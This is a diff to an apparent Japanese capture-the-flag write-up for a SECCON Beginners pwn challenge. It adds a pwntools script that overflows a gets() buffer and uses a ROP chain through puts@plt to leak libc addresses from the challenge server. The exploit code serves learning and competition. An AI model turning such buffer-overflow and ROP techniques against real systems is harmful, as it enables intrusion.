@@ -89,6 +89,7 @@ gef> info functions
 0x0000000000400550  printf@plt
 0x0000000000400560  __libc_start_main@plt
 0x0000000000400570  gets@plt
+(snip)
 gef> disas 0x0000000000400540
 Dump of assembler code for function system@plt:
    0x0000000000400540 <+0>:	jmp    QWORD PTR [rip+0x200ae2]        # 0x601028
@@ -109,10 +110,46 @@ Dump of assembler code for function gets@plt:
    0x0000000000400576 <+6>:	push   0x5
    0x000000000040057b <+11>:	jmp    0x400510
 End of assembler dump.
-
 ```
 
-
+# libc version check
 まずサーバの*libc*を調べる
 
+```python
+# -*- coding: utf-8 -*-
+from pwn import *
+
+popret = 0x0000000000400763
+puts_plt = 0x0000000000400520
+system_got = 0x601028
+puts_got = 0x601018
+gets_got = 0x601040
+
+def upack(hexstr):
+    return hex(u64(hexstr + ('\x00'*(8 - len(hexstr)))))
+
+# popretでそれぞれのgotアドレスをレジスタに移して、puts@pltで呼び出し先のアドレスを出力
+buf = ''
+buf += 'A'*136
+buf += p64(popret)
+buf += p64(system_got)
+buf += p64(puts_plt)
+buf += p64(popret)
+buf += p64(puts_got)
+buf += p64(puts_plt)
+buf += p64(popret)
+buf += p64(gets_got)
+buf += p64(puts_plt)
+
+r = remote('pwn1.chall.beginners.seccon.jp', 18373)
+r.recvuntil('Input Content : ')
+r.sendline(buf)
+a = r.recvall()
+spl = a.split('\n')
+
+hexaddrs = map(lambda x: upack(x), spl[-4:-1])
+print 'system:', hexaddrs[0]
+print 'puts  :', hexaddrs[1]
+print 'gets  :', hexaddrs[2]
+```
 
